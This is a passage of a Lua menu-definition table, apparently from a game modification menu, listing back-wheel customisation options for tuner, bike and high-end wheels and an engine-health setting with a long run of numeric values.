            {text = 'Tuner', dkey = 'vehicle:customs:wheels_btuner', desc = 'Tuner back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Tuner back wheel', length = 15, tipus = 'betu', extra = 24, extra2 = 5, func = {'Cosmo', 'Supermesh', 'Outsider', 'Rollas', 'Driffmeister', 'Slicer', 'Elquatro', 'Dubbed', 'Fivestar', 'Slideways', 'Apex', 'Stancedeg', 'Countersteer', 'Endov1', 'Endov2dish', 'Guppez', 'Chokadori', 'Chicane', 'Saisoku', 'Dishedeight', 'Fujiwara', 'Zokusha', 'Battlevlll', 'Rallymaster'}},
            {text = 'Bike', dkey = 'vehicle:customs:wheels_bbike', desc = 'Bike back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Bike back wheel', length = 15, tipus = 'betu', extra = 24, extra2 = 6, func = {'Speedway', 'Streetspecial', 'Racer', 'Trackstar', 'Overlord', 'Trident', 'Triplethreat', 'Stilleto', 'Wires', 'Bobber', 'Solidus', 'Iceshield', 'Loops'}},
            {text = 'High end', dkey = 'vehicle:customs:wheels_bhighend', desc = 'High end back wheels.', afu = __REAPER1__.M.vehicle.customs.wheels.wheel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'High end back wheel', length = 15, tipus = 'betu', extra = 24, extra2 = 7, func = {'Shadow', 'Hypher', 'Blade', 'Diamond', 'Supagee', 'Chromaticz', 'Merciechlip', 'Obeyrs', 'Gtchrome', 'Cheetahr', 'Solar', 'Splitten', 'Dashvip', 'Lozspeedten', 'Carboninferno', 'Carbonshadow', 'Carbonz', 'Carbonsolar', 'Carboncheetahr', 'Carbonsracer'}},
        },

        ['vehicle:fixing'] = {
            {text = 'Engine health', dkey = 'vehicle:fixing_enginehealth', desc = 'Set the vehicle\'s engine health.', afu = __REAPER1__.M.vehicle.fixing.enginehealth, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Engine health number', length = 4, tipus = 'szam', func = {-4000, -3999, -3998, -3997, -3996, -3995, -3994, -3993, -3992, -3991, -3990, -3989, -3988, -3987, -3986, -3985, -3984, -3983, -3982, -3981, -3980, -3979, -3978, -3977, -3976, -3975, -3974, -3973, -3972, -3971, -3970, -3969, -3968, -3967, -3966, -3965, -3964, -3963, -3962, -3961, -3960, -3959, -3958, -3957, -3956, -3955, -3954, -3953, -3952, -3951, -3950, -3949, -3948, -3947, -3946, -3945, -3944, -3943, -3942, -3941, -3940, -3939, -3938, -3937, -3936, -3935, -3934, -3933, -3932, -3931, -3930, -3929, -3928, -3927, -3926, -3925, -3924, -3923, -3922, -3921, -3920, -3919, -3918, -3917, -3916, -3915, -3914, -3913, -3912, -3911, -3910, -3909, -3908, -3907, -3906, -3905, -3904, -3903, -3902, -3901, -3900, -3899, -3898, -3897, -3896, -3895, -3894, -3893, -3892, -3891, -3890, -3889, -3888, -3887, -3886, -3885, -3884, -3883, -3882, -3881, -3880, -3879, -3878, -3877, -3876, -3875, -3874, -3873, -3872, -3871, -3870, -3869, -3868, -3867, -3866, -3865, -3864, -3863, -3862, -3861, -3860, -3859, -3858, -3857, -3856, -3855, -3854, -3853, -3852, -3851, -3850, -3849, -3848, -3847, -3846, -3845, -3844, -3843, -3842, -3841, -3840, -3839, -3838, -3837, -3836, -3835, -3834, -3833, -3832, -3831, -3830, -3829, -3828, -3827, -3826, -3825, -3824, -3823, -3822, -3821, -3820, -3819, -3818, -3817, -3816, -3815, -3814, -3813, -3812, -3811, -3810, -3809, -3808, -3807, -3806, -3805, -3804, -3803, -3802, -3801, -3800, -3799, -3798, -3797, -3796, -3795, -3794, -3793, -3792, -3791, -3790, -3789, -3788, -3787, -3786, -3785, -3784, -3783, -3782, -3781, -3780, -3779, -3778, -3777, -3776, -3775, -3774, -3773, -3772, -3771, -3770, -3769, -3768, -3767, -3766, -3765, -3764, -3763, -3762, -3761, -3760, -3759, -3758, -3757, -3756, -3755, -3754, -3753, -3752, -3751, -3750, -3749, -3748, -3747, -3746, -3745, -3744, -3743, -3742, -3741, -3740, -3739, -3738, -3737, -3736, -3735, -3734, -3733, -3732, -3731, -3730, -3729, -3728, -3727, -3726, -3725, -3724, -3723, -3722, -3721, -3720, -3719, -3718, -3717, -3716, -3715, -3714, -3713, -3712, -3711, -3710, -3709, -3708, -3707, -3706, -3705, -3704, -3703, -3702, -3701, -3700, -3699, -3698, -3697, -3696, -3695, -3694, -3693, -3692, -3691, -3690, -3689, -3688, -3687, -3686, -3685, -3684, -3683, -3682, -3681, -3680, -3679, -3678, -3677, -3676, -3675, -3674, -3673, -3672, -3671, -3670, -3669, -3668, -3667, -3666, -3665, -3664, -3663, -3662, -3661, -3660, -3659, -3658, -3657, -3656, -3655, -3654, -3653, -3652, -3651, -3650, -3649, -3648, -3647, -3646, -3645, -3644, -3643, -3642, -3641, -3640, -3639, -3638, -3637, -3636, -3635, -3634, -3633, -3632, -3631, -3630, -3629, -3628, -3627, -3626, -3625, -3624, -3623, -3622, -3621, -3620, -3619, -3618, -3617, -3616, -3615, -3614, -3613, -3612, -3611, -3610, -3609, -3608, -3607, -3606, -3605, -3604, -3603, -3602, -3601, -3600, -3599, -3598, -3597, -3596, -3595, -3594, -3593, -3592, -3591, -3590, -3589, -3588, -3587, -3586, -3585, -3584, -3583, -3582, -3581, -3580, -3579, -3578, -3577, -3576, -3575, -3574, -3573, -3572, -3571, -3570, -3569, -3568, -3567, -3566, -3565, -3564, -3563, -3562, -3561, -3560, -3559, -3558, -3557, -3556, -3555, -3554, -3553, -3552, -3551, -3550, -3549, -3548, -3547, -3546, -3545, -3544, -3543, -3542, -3541, -3540, -3539, -3538, -3537, -3536, -3535, -3534, -3533, -3532, -3531, -3530, -3529, -3528, -3527, -3526, -3525, -3524, -3523, -3522, -3521, -3520, -3519, -3518, -3517, -3516, -3515, -3514, -3513, -3512, -3511, -3510, -3509, -3508, -3507, -3506, -3505, -3504, -3503, -3502, -3501, -3500, -3499, -3498, -3497, -3496, -3495, -3494, -3493, -3492, -3491, -3490, -3489, -3488, -3487, -3486, -3485, -3484, -3483, -3482, -3481, -3480, -3479, -3478, -3477, -3476, -3475, -3474, -3473, -3472, -3471, -3470, -3469, -3468, -3467, -3466, -3465, -3464, -3463, -3462, -3461, -3460, -3459, -3458, -3457, -3456, -3455, -3454, -3453, -3452, -3451, -3450, -3449, -3448, -3447, -3446, -3445, -3444, -3443, -3442, -3441, -3440, -3439, -3438, -3437, -3436, -3435, -3434, -3433, -3432, -3431, -3430, -3429, -3428, -3427, -3426, -3425, -3424, -3423, -3422, -3421, -3420, -3419, -3418, -3417, -3416, -3415, -3414, -3413, -3412, -3411, -3410, -3409, -3408, -3407, -3406, -3405, -3404, -3403, -3402, -3401, -3400, -3399, -3398, -3397, -3396, -3395, -3394, -3393, -3392, -3391, -3390, -3389, -3388, -3387, -3386, -3385, -3384, -3383, -3382, -3381, -3380, -3379, -3378, -3377, -3376, -3375, -3374, -3373, -3372, -3371, -3370, -3369, -3368, -3367, -3366, -3365, -3364, -3363, -3362, -3361, -3360, -3359, -3358, -3357, -3356, -3355, -3354, -3353, -3352, -3351, -3350, -3349, -3348, -3347, -3346, -3345, -3344, -3343, -3342, -3341, -3340, -3339, -3338, -3337, -3336, -3335, -3334, -3333, -3332, -3331, -3330, -3329, -3328, -3327, -3326, -3325, -3324, -3323, -3322, -3321, -3320, -3319, -3318, -3317, -3316, -3315, -3314, -3313, -3312, -3311, -3310, -3309, -3308, -3307, -3306, -3305, -3304, -3303, -3302, -3301, -3300, -3299, -3298, -3297, -3296, -3295, -3294, -3293, -3292, -3291, -3290, -3289, -3288, -3287, -3286, -3285, -3284, -3283, -3282, -3281, -3280, -3279, -3278, -3277, -3276, -3275, -3274, -3273, -3272, -3271, -3270, -3269, -3268, -3267, -3266, -3265, -3264, -3263, -3262, -3261, -3260, -3259, -3258, -3257, -3256, -3255, -3254, -3253, -3252, -3251, -3250, -3249, -3248, -3247, -3246, -3245, -3244, -3243, -3242, -3241, -3240, -3239, -3238, -3237, -3236, -3235, -3234, -3233, -3232, -3231, -3230, -3229, -3228, -3227, -3226, -3225, -3224, -3223, -3222, -3221, -3220, -3219, -3218, -3217, -3216, -3215, -3214, -3213, -3212, -3211, -3210, -3209, -3208, -3207, -3206, -3205, -3204, -3203, -3202, -3201, -3200, -3199, -3198, -3197, -3196, -3195, -3194, -3193, -3192, -3191, -3190, -3189, -3188, -3187, -3186, -3185, -3184, -3183, -3182, -3181, -3180, -3179, -3178, -3177, -3176, -3175, -3174, -3173, -3172, -3171, -3170, -3169, -3168, -3167, -3166, -3165, -3164, -3163, -3162, -3161, -3160, -3159, -3158, -3157, -3156, -3155, -3154, -3153, -3152, -3151, -3150, -3149, -3148, -3147, -3146, -3145, -3144, -3143, -3142, -3141, -3140, -3139, -3138, -3137, -3136, -3135, -3134, -3133, -3132, -3131, -3130, -3129, -3128, -3127, -3126, -3125, -3124, -3123, -3122, -3121, -3120, -3119, -3118, -3117, -3116, -3115, -3114, -3113, -3112, -3111, -3110, -3109, -3108, -3107, -3106, -3105, -3104, -3103, -3102, -3101, -3100, -3099, -3098, -3097, -3096, -3095, -3094, -3093, -3092, -3091, -3090, -3089, -3088, -3087, -3086, -3085, -3084, -3083, -3082, -3081, -3080, -3079, -3078, -3077, -3076, -3075, -3074, -3073, -3072, -3071, -3070, -3069, -3068, -3067, -3066, -3065, -3064, -3063, -3062, -3061, -3060, -3059, -3058, -3057, -3056, -3055, -3054, -3053, -3052, -3051, -3050, -3049, -3048, -3047, -3046, -3045, -3044, -3043, -3042, -3041, -3040, -3039, -3038, -3037, -3036, -3035, -3034, -3033, -3032, -3031, -3030, -3029, -3028, -3027, -3026, -3025, -3024, -3023, -3022, -3021, -3020, -3019, -3018, -3017, -3016, -3015, -3014, -3013, -3012, -3011, -3010, -3009, -3008, -3007, -3006, -3005, -3004, -3003, -3002, -3001, -3000, -2999, -2998, -2997, -2996, -2995, -2994, -2993, -2992, -2991, -2990, -2989, -2988, -2987, -2986, -2985, -2984, -2983, -2982, -2981, -2980, -2979, -2978, -2977, -2976, -2975, -2974, -2973, -2972, -2971, -2970, -2969, -2968, -2967, -2966, -2965, -2964, -2963, -2962, -2961, -2960, -2959, -2958, -2957, -2956, -2955, -2954, -2953, -2952, -2951, -2950, -2949, -2948, -2947, -2946, -2945, -2944, -2943, -2942, -2941, -2940, -2939, -2938, -2937, -2936, -2935, -2934, -2933, -2932, -2931, -2930, -2929, -2928, -2927, -2926, -2925, -2924, -2923, -2922, -2921, -2920, -2919, -2918, -2917, -2916, -2915, -2914, -2913, -2912, -2911, -2910, -2909, -2908, -2907, -2906, -2905, -2904, -2903, -2902, -2901, -2900, -2899, -2898, -2897, -2896, -2895, -2894, -2893, -2892, -2891, -2890, -2889, -2888, -2887, -2886, -2885, -2884, -2883, -2882, -2881, -2880, -2879, -2878, -2877, -2876, -2875, -2874, -2873, -2872, -2871, -2870, -2869, -2868, -2867, -2866, -2865, -2864, -2863, -2862, -2861, -2860, -2859, -2858, -2857, -2856, -2855, -2854, -2853, -2852, -2851, -2850, -2849, -2848, -2847, -2846, -2845, -2844, -2843, -2842, -2841, -2840, -2839, -2838, -2837, -2836, -2835, -2834, -2833, -2832, -2831, -2830, -2829, -2828, -2827, -2826, -2825, -2824, -2823, -2822, -2821, -2820, -2819, -2818, -2817, -2816, -2815, -2814, -2813, -2812, -2811, -2810, -2809, -2808, -2807, -2806, -2805, -2804, -2803, -2802, -2801, -2800, -2799, -2798, -2797, -2796, -2795, -2794, -2793, -2792, -2791, -2790, -2789, -2788, -2787, -2786, -2785, -2784, -2783, -2782, -2781, -2780, -2779, -2778, -2777, -2776, -2775, -2774, -2773, -2772, -2771, -2770, -2769, -2768, -2767, -2766, -2765, -2764, -2763, -2762, -2761, -2760, -2759, -2758, -2757, -2756, -2755, -2754, -2753, -2752, -2751, -2750, -2749, -2748, -2747, -2746, -2745, -2744, -2743, -2742, -2741, -2740, -2739, -2738, -2737, -2736, -2735, -2734, -2733, -2732, -2731, -2730, -2729, -2728, -2727, -2726, -2725, -2724, -2723, -2722, -2721, -2720, -2719, -2718, -2717, -2716, -2715, -2714, -2713, -2712, -2711, -2710, -2709, -2708, -2707, -2706, -2705, -2704, -2703, -2702, -2701, -2700, -2699, -2698, -2697, -2696, -2695, -2694, -2693, -2692, -2691, -2690, -2689, -2688, -2687, -2686, -2685, -2684, -2683, -2682, -2681, -2680, -2679, -2678, -2677, -2676, -2675, -2674, -2673, -2672, -2671, -2670, -2669, -2668, -2667, -2666, -2665, -2664, -2663, -2662, -2661, -2660, -2659, -2658, -2657, -2656, -2655, -2654, -2653, -2652, -2651, -2650, -2649, -2648, -2647, -2646, -2645, -2644, -2643, -2642, -2641, -2640, -2639, -2638, -2637, -2636, -2635, -2634, -2633, -2632, -2631, -2630, -2629, -2628, -2627, -2626, -2625, -2624, -2623, -2622, -2621, -2620, -2619, -2618, -2617, -2616, -2615, -2614, -2613, -2612, -2611, -2610, -2609, -2608, -2607, -2606, -2605, -2604, -2603, -2602, -2601, -2600, -2599, -2598, -2597, -2596, -2595, -2594, -2593, -2592, -2591, -2590, -2589, -2588, -2587, -2586, -2585, -2584, -2583, -2582, -2581, -2580, -2579, -2578, -2577, -2576, -2575, -2574, -2573, -2572, -2571, -2570, -2569, -2568, -2567, -2566, -2565, -2564, -2563, -2562, -2561, -2560, -2559, -2558, -2557, -2556, -2555, -2554, -2553, -2552, -2551, -2550, -2549, -2548, -2547, -2546, -2545, -2544, -2543, -2542, -2541, -2540, -2539, -2538, -2537, -2536, -2535, -2534, -2533, -2532, -2531, -2530, -2529, -2528, -2527, -2526, -2525, -2524, -2523, -2522, -2521, -2520, -2519, -2518, -2517, -2516, -2515, -2514, -2513, -2512, -2511, -2510, -2509, -2508, -2507, -2506, -2505, -2504, -2503, -2502, -2501, -2500, -2499, -2498, -2497, -2496, -2495, -2494, -2493, -2492, -2491, -2490, -2489, -2488, -2487, -2486, -2485, -2484, -2483, -2482, -2481, -2480, -2479, -2478, -2477, -2476, -2475, -2474, -2473, -2472, -2471, -2470, -2469, -2468, -2467, -2466, -2465, -2464, -2463, -2462, -2461, -2460, -2459, -2458, -2457, -2456, -2455, -2454, -2453, -2452, -2451, -2450, -2449, -2448, -2447, -2446, -2445, -2444, -2443, -2442, -2441, -2440, -2439, -2438, -2437, -2436, -2435, -2434, -2433, -2432, -2431, -2430, -2429, -2428, -2427, -2426, -2425, -2424, -2423, -2422, -2421, -2420, -2419, -2418, -2417, -2416, -2415, -2414, -2413, -2412, -2411, -2410, -2409, -2408, -2407, -2406, -2405, -2404, -2403, -2402, -2401, -2400, -2399, -2398, -2397, -2396, -2395, -2394, -2393, -2392, -2391, -2390, -2389, -2388, -2387, -2386, -2385, -2384, -2383, -2382, -2381, -2380, -2379, -2378, -2377, -2376, -2375, -2374, -2373, -2372, -2371, -2370, -2369, -2368, -2367, -2366, -2365, -2364, -2363, -2362, -2361, -2360, -2359, -2358, -2357, -2356, -2355, -2354, -2353, -2352, -2351, -2350, -2349, -2348, -2347, -2346, -2345, -2344, -2343, -2342, -2341, -2340, -2339, -2338, -2337, -2336, -2335, -2334, -2333, -2332, -2331, -2330, -2329, -2328, -2327, -2326, -2325, -2324, -2323, -2322, -2321, -2320, -2319, -2318, -2317, -2316, -2315, -2314, -2313, -2312, -2311, -2310, -2309, -2308, -2307, -2306, -2305, -2304, -2303, -2302, -2301, -2300, -2299, -2298, -2297, -2296, -2295, -2294, -2293, -2292, -2291, -2290, -2289, -2288, -2287, -2286, -2285, -2284, -2283, -2282, -2281, -2280, -2279, -2278, -2277, -2276, -2275, -2274, -2273, -2272, -2271, -2270, -2269, -2268, -2267, -2266, -2265, -2264, -2263, -2262, -2261, -2260, -2259, -2258, -2257, -2256, -2255, -2254, -2253, -2252, -2251, -2250, -2249, -2248, -2247, -2246, -2245, -2244, -2243, -2242, -2241, -2240, -2239, -2238, -2237, -2236, -2235, -2234, -2233, -2232, -2231, -2230, -2229, -2228, -2227, -2226, -2225, -2224, -2223, -2222, -2221, -2220, -2219, -2218, -2217, -2216, -2215, -2214, -2213, -2212, -2211, -2210, -2209, -2208, -2207, -2206, -2205, -2204, -2203, -2202, -2201, -2200, -2199, -2198, -2197, -2196, -2195, -2194, -2193, -2192, -2191, -2190, -2189, -2188, -2187, -2186, -2185, -2184, -2183, -2182, -2181, -2180, -2179, -2178, -2177, -2176, -2175, -2174, -2173, -2172, -2171, -2170, -2169, -2168, -2167, -2166, -2165, -2164, -2163, -2162, -2161, -2160, -2159, -2158, -2157, -2156, -2155, -2154, -2153, -2152, -2151, -2150, -2149, -2148, -2147, -2146, -2145, -2144, -2143, -2142, -2141, -2140, -2139, -2138, -2137, -2136, -2135, -2134, -2133, -2132, -2131, -2130, -2129, -2128, -2127, -2126, -2125, -2124, -2123, -2122, -2121, -2120, -2119, -2118, -2117, -2116, -2115, -2114, -2113, -2112, -2111, -2110, -2109, -2108, -2107, -2106, -2105, -2104, -2103, -2102, -2101, -2100, -2099, -2098, -2097, -2096, -2095, -2094, -2093, -2092, -2091, -2090, -2089, -2088, -2087, -2086, -2085, -2084, -2083, -2082, -2081, -2080, -2079, -2078, -2077, -2076, -2075, -2074, -2073, -2072, -2071, -2070, -2069, -2068, -2067, -2066, -2065, -2064, -2063, -2062, -2061, -2060, -2059, -2058, -2057, -2056, -2055, -2054, -2053, -2052, -2051, -2050, -2049, -2048, -2047, -2046, -2045, -2044, -2043, -2042, -2041, -2040, -2039, -2038, -2037, -2036, -2035, -2034, -2033, -2032, -2031, -2030, -2029, -2028, -2027, -2026, -2025, -2024, -2023, -2022, -2021, -2020, -2019, -2018, -2017, -2016, -2015, -2014, -2013, -2012, -2011, -2010, -2009, -2008, -2007, -2006, -2005, -2004, -2003, -2002, -2001, -2000, -1999, -1998, -1997, -1996, -1995, -1994, -1993, -1992, -1991, -1990, -1989, -1988, -1987, -1986, -1985, -1984, -1983, -1982, -1981, -1980, -1979, -1978, -1977, -1976, -1975, -1974, -1973, -1972, -1971, -1970, -1969, -1968, -1967, -1966, -1965, -1964, -1963, -1962, -1961, -1960, -1959, -1958, -1957, -1956, -1955, -1954, -1953, -1952, -1951, -1950, -1949, -1948, -1947, -1946, -1945, -1944, -1943, -1942, -1941, -1940, -1939, -1938, -1937, -1936, -1935, -1934, -1933, -1932, -1931, -1930, -1929, -1928, -1927, -1926, -1925, -1924, -1923, -1922, -1921, -1920, -1919, -1918, -1917, -1916, -1915, -1914, -1913, -1912, -1911, -1910, -1909, -1908, -1907, -1906, -1905, -1904, -1903, -1902, -1901, -1900, -1899, -1898, -1897, -1896, -1895, -1894, -1893, -1892, -1891, -1890, -1889, -1888, -1887, -1886, -1885, -1884, -1883, -1882, -1881, -1880, -1879, -1878, -1877, -1876, -1875, -1874, -1873, -1872, -1871, -1870, -1869, -1868, -1867, -1866, -1865, -1864, -1863, -1862, -1861, -1860, -1859, -1858, -1857, -1856, -1855, -1854, -1853, -1852, -1851, -1850, -1849, -1848, -1847, -1846, -1845, -1844, -1843, -1842, -1841, -1840, -1839, -1838, -1837, -1836, -1835, -1834, -1833, -1832, -1831, -1830, -1829, -1828, -1827, -1826, -1825, -1824, -1823, -1822, -1821, -1820, -1819, -1818, -1817, -1816, -1815, -1814, -1813, -1812, -1811, -1810, -1809, -1808, -1807, -1806, -1805, -1804, -1803, -1802, -1801, -1800, -1799, -1798, -1797, -1796, -1795, -1794, -1793, -1792, -1791, -1790, -1789, -1788, -1787, -1786, -1785, -1784, -1783, -1782, -1781, -1780, -1779, -1778, -1777, -1776, -1775, -1774, -1773, -1772, -1771, -1770, -1769, -1768, -1767, -1766, -1765, -1764, -1763, -1762, -1761, -1760, -1759, -1758, -1757, -1756, -1755, -1754, -1753, -1752, -1751, -1750, -1749, -1748, -1747, -1746, -1745, -1744, -1743, -1742, -1741, -1740, -1739, -1738, -1737, -1736, -1735, -1734, -1733, -1732, -1731, -1730, -1729, -1728, -1727, -1726, -1725, -1724, -1723, -1722, -1721, -1720, -1719, -1718, -1717, -1716, -1715, -1714, -1713, -1712, -1711, -1710, -1709, -1708, -1707, -1706, -1705, -1704, -1703, -1702, -1701, -1700, -1699, -1698, -1697, -1696, -1695, -1694, -1693, -1692, -1691, -1690, -1689, -1688, -1687, -1686, -1685, -1684, -1683, -1682, -1681, -1680, -1679, -1678, -1677, -1676, -1675, -1674, -1673, -1672, -1671, -1670, -1669, -1668, -1667, -1666, -1665, -1664, -1663, -1662, -1661, -1660, -1659, -1658, -1657, -1656, -1655, -1654, -1653, -1652, -1651, -1650, -1649, -1648, -1647, -1646, -1645, -1644, -1643, -1642, -1641, -1640, -1639, -1638, -1637, -1636, -1635, -1634, -1633, -1632, -1631, -1630, -1629, -1628, -1627, -1626, -1625, -1624, -1623, -1622, -1621, -1620, -1619, -1618, -1617, -1616, -1615, -1614, -1613, -1612, -1611, -1610, -1609, -1608, -1607, -1606, -1605, -1604, -1603, -1602, -1601, -1600, -1599, -1598, -1597, -1596, -1595, -1594, -1593, -1592, -1591, -1590, -1589, -1588, -1587, -1586, -1585, -1584, -1583, -1582, -1581, -1580, -1579, -1578, -1577, -1576, -1575, -1574, -1573, -1572, -1571, -1570, -1569, -1568, -1567, -1566, -1565, -1564, -1563, -1562, -1561, -1560, -1559, -1558, -1557, -1556, -1555, -1554, -1553, -1552, -1551, -1550, -1549, -1548, -1547, -1546, -1545, -1544, -1543, -1542, -1541, -1540, -1539, -1538, -1537, -1536, -1535, -1534, -1533, -1532, -1531, -1530, -1529, -1528, -1527, -1526, -1525, -1524, -1523, -1522, -1521, -1520, -1519, -1518, -1517, -1516, -1515, -1514, -1513, -1512, -1511, -1510, -1509, -1508, -1507, -1506, -1505, -1504, -1503, -1502, -1501, -1500, -1499, -1498, -1497, -1496, -1495, -1494, -1493, -1492, -1491, -1490, -1489, -1488, -1487, -1486, -1485, -1484, -1483, -1482, -1481, -1480, -1479, -1478, -1477, -1476, -1475, -1474, -1473, -1472, -1471, -1470, -1469, -1468, -1467, -1466, -1465, -1464, -1463, -1462, -1461, -1460, -1459, -1458, -1457, -1456, -1455, -1454, -1453, -1452, -1451, -1450, -1449, -1448, -1447, -1446, -1445, -1444, -1443, -1442, -1441, -1440, -1439, -1438, -1437, -1436, -1435, -1434, -1433, -1432, -1431, -1430, -1429, -1428, -1427, -1426, -1425, -1424, -1423, -1422, -1421, -1420, -1419, -1418, -1417, -1416, -1415, -1414, -1413, -1412, -1411, -1410, -1409, -1408, -1407, -1406, -1405, -1404, -1403, -1402, -1401, -1400, -1399, -1398, -1397, -1396, -1395, -1394, -1393, -1392, -1391, -1390, -1389, -1388, -1387, -1386, -1385, -1384, -1383, -1382, -1381, -1380, -1379, -1378, -1377, -1376, -1375, -1374, -1373, -1372, -1371, -1370, -1369, -1368, -1367, -1366, -1365, -1364, -1363, -1362, -1361, -1360, -1359, -1358, -1357, -1356, -1355, -1354, -1353, -1352, -1351, -1350, -1349, -1348, -1347, -1346, -1345, -1344, -1343, -1342, -1341, -1340, -1339, -1338, -1337, -1336, -1335, -1334, -1333, -1332, -1331, -1330, -1329, -1328, -1327, -1326, -1325, -1324, -1323, -1322, -1321, -1320, -1319, -1318, -1317, -1316, -1315, -1314, -1313, -1312, -1311, -1310, -1309, -1308, -1307, -1306, -1305, -1304, -1303, -1302, -1301, -1300, -1299, -1298, -1297, -1296, -1295, -1294, -1293, -1292, -1291, -1290, -1289, -1288, -1287, -1286, -1285, -1284, -1283, -1282, -1281, -1280, -1279, -1278, -1277, -1276, -1275, -1274, -1273, -1272, -1271, -1270, -1269, -1268, -1267, -1266, -1265, -1264, -1263, -1262, -1261, -1260, -1259, -1258, -1257, -1256, -1255, -1254, -1253, -1252, -1251, -1250, -1249, -1248, -1247, -1246, -1245, -1244, -1243, -1242, -1241, -1240, -1239, -1238, -1237, -1236, -1235, -1234, -1233, -1232, -1231, -1230, -1229, -1228, -1227, -1226, -1225, -1224, -1223, -1222, -1221, -1220, -1219, -1218, -1217, -1216, -1215, -1214, -1213, -1212, -1211, -1210, -1209, -1208, -1207, -1206, -1205, -1204, -1203, -1202, -1201, -1200, -1199, -1198, -1197, -1196, -1195, -1194, -1193, -1192, -1191, -1190, -1189, -1188, -1187, -1186, -1185, -1184, -1183, -1182, -1181, -1180, -1179, -1178, -1177, -1176, -1175, -1174, -1173, -1172, -1171, -1170, -1169, -1168, -1167, -1166, -1165, -1164, -1163, -1162, -1161, -1160, -1159, -1158, -1157, -1156, -1155, -1154, -1153, -1152, -1151, -1150, -1149, -1148, -1147, -1146, -1145, -1144, -1143, -1142, -1141, -1140, -1139, -1138, -1137, -1136, -1135, -1134, -1133, -1132, -1131, -1130, -1129, -1128, -1127, -1126, -1125, -1124, -1123, -1122, -1121, -1120, -1119, -1118, -1117, -1116, -1115, -1114, -1113, -1112, -1111, -1110, -1109, -1108, -1107, -1106, -1105, -1104, -1103, -1102, -1101, -1100, -1099, -1098, -1097, -1096, -1095, -1094, -1093, -1092, -1091, -1090, -1089, -1088, -1087, -1086, -1085, -1084, -1083, -1082, -1081, -1080, -1079, -1078, -1077, -1076, -1075, -1074, -1073, -1072, -1071, -1070, -1069, -1068, -1067, -1066, -1065, -1064, -1063, -1062, -1061, -1060, -1059, -1058, -1057, -1056, -1055, -1054, -1053, -1052, -1051, -1050, -1049, -1048, -1047, -1046, -1045, -1044, -1043, -1042, -1041, -1040, -1039, -1038, -1037, -1036, -1035, -1034, -1033, -1032, -1031, -1030, -1029, -1028, -1027, -1026, -1025, -1024, -1023, -1022, -1021, -1020, -1019, -1018, -1017, -1016, -1015, -1014, -1013, -1012, -1011, -1010, -1009, -1008, -1007, -1006, -1005, -1004, -1003, -1002, -1001, -1000, -999, -998, -997, -996, -995, -994, -993, -992, -991, -990, -989, -988, -987, -986, -985, -984, -983, -982, -981, -980, -979, -978, -977, -976, -975, -974, -973, -972, -971, -970, -969, -968, -967, -966, -965, -964, -963, -962, -961, -960, -959, -958, -957, -956, -955, -954, -953, -952, -951, -950, -949, -948, -947, -946, -945, -944, -943, -942, -941, -940, -939, -938, -937, -936, -935, -934, -933, -932, -931, -930, -929, -928, -927, -926, -925, -924, -923, -922, -921, -920, -919, -918, -917, -916, -915, -914, -913, -912, -911, -910, -909, -908, -907, -906, -905, -904, -903, -902, -901, -900, -899, -898, -897, -896, -895, -894, -893, -892, -891, -890, -889, -888, -887, -886, -885, -884, -883, -882, -881, -880, -879, -878, -877, -876, -875, -874, -873, -872, -871, -870, -869, -868, -867, -866, -865, -864, -863, -862, -861, -860, -859, -858, -857, -856, -855, -854, -853, -852, -851, -850, -849, -848, -847, -846, -845, -844, -843, -842, -841, -840, -839, -838, -837, -836, -835, -834, -833, -832, -831, -830, -829, -828, -827, -826, -825, -824, -823, -822, -821, -820, -819, -818, -817, -816, -815, -814, -813, -812, -811, -810, -809, -808, -807, -806, -805, -804, -803, -802, -801, -800, -799, -798, -797, -796, -795, -794, -793, -792, -791, -790, -789, -788, -787, -786, -785, -784, -783, -782, -781, -780, -779, -778, -777, -776, -775, -774, -773, -772, -771, -770, -769, -768, -767, -766, -765, -764, -763, -762, -761, -760, -759, -758, -757, -756, -755, -754, -753, -752, -751, -750, -749, -748, -747, -746, -745, -744, -743, -742, -741, -740, -739, -738, -737, -736, -735, -734, -733, -732, -731, -730, -729, -728, -727, -726, -725, -724, -723, -722, -721, -720, -719, -718, -717, -716, -715, -714, -713, -712, -711, -710, -709, -708, -707, -706, -705, -704, -703, -702, -701, -700, -699, -698, -697, -696, -695, -694, -693, -692, -691, -690, -689, -688, -687, -686, -685, -684, -683, -682, -681, -680, -679, -678, -677, -676, -675, -674, -673, -672, -671, -670, -669, -668, -667, -666, -665, -664, -663, -662, -661, -660, -659, -658, -657, -656, -655, -654, -653, -652, -651, -650, -649, -648, -647, -646, -645, -644, -643, -642, -641, -640, -639, -638, -637, -636, -635, -634, -633, -632, -631, -630, -629, -628, -627, -626, -625, -624, -623, -622, -621, -620, -619, -618, -617, -616, -615, -614, -613, -612, -611, -610, -609, -608, -607, -606, -605, -604, -603, -602, -601, -600, -599, -598, -597, -596, -595, -594, -593, -592, -591, -590, -589, -588, -587, -586, -585, -584, -583, -582, -581, -580, -579, -578, -577, -576, -575, -574, -573, -572, -571, -570, -569, -568, -567, -566, -565, -564, -563, -562, -561, -560, -559, -558, -557, -556, -555, -554, -553, -552, -551, -550, -549, -548, -547, -546, -545, -544, -543, -542, -541, -540, -539, -538, -537, -536, -535, -534, -533, -532, -531, -530, -529, -528, -527, -526, -525, -524, -523, -522, -521, -520, -519, -518, -517, -516, -515, -514, -513, -512, -511, -510, -509, -508, -507, -506, -505, -504, -503, -502, -501, -500, -499, -498, -497, -496, -495, -494, -493, -492, -491, -490, -489, -488, -487, -486, -485, -484, -483, -482, -481, -480, -479, -478, -477, -476, -475, -474, -473, -472, -471, -470, -469, -468, -467, -466, -465, -464, -463, -462, -461, -460, -459, -458, -457, -456, -455, -454, -453, -452, -451, -450, -449, -448, -447, -446, -445, -444, -443, -442, -441, -440, -439, -438, -437, -436, -435, -434, -433, -432, -431, -430, -429, -428, -427, -426, -425, -424, -423, -422, -421, -420, -419, -418, -417, -416, -415, -414, -413, -412, -411, -410, -409, -408, -407, -406, -405, -404, -403, -402, -401, -400, -399, -398, -397, -396, -395, -394, -393, -392, -391, -390, -389, -388, -387, -386, -385, -384, -383, -382, -381, -380, -379, -378, -377, -376, -375, -374, -373, -372, -371, -370, -369, -368, -367, -366, -365, -364, -363, -362, -361, -360, 